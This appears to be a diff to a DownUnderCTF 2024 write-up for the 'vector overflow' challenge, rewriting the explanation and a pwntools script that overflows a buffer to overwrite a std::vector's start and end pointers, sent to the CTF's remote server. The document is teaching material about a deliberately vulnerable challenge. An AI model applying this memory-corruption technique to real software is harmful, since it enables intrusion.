@@ -18,7 +18,7 @@ Challenges and official solutions are available at [DownUnderCTF/Challenges\_202
 
 ### vector overflow (239 solves)
 
-See the source code of `vector`:
+See the source code of `std::vector`:
 
 ```cpp
       struct _Vector_impl_data
@@ -28,14 +28,20 @@ See the source code of `vector`:
     pointer _M_end_of_storage;
 ```
 
-So we need to write the addresses to the start and end of a string `DUCTF`. Use gdb and try a few times to get the correct addresses and offsets.
+So we can write the string `DUCTF` at the start of the buffer, and then write the start and end addresses of the string into the vector.
 
 ```python
 from pwn import *
 
-# p = process('./vector_overflow_raw')
+b = ELF('./vector_overflow')
+context.binary = b
+# p = process()
 p = remote('2024.ductf.dev', 30013)
-p.sendline(b'DUCTF' + b'A' * 11 + p64(0x4051e0) + p64(0x4051e5))
+target = b'DUCTF'
+buf_start = b.symbols['buf']
+target_end = buf_start + len(target)
+v_start = b.symbols['v']
+p.sendline(flat(target, length=v_start-buf_start) + p64(buf_start) + p64(target_end))
 p.interactive()
 ```
 
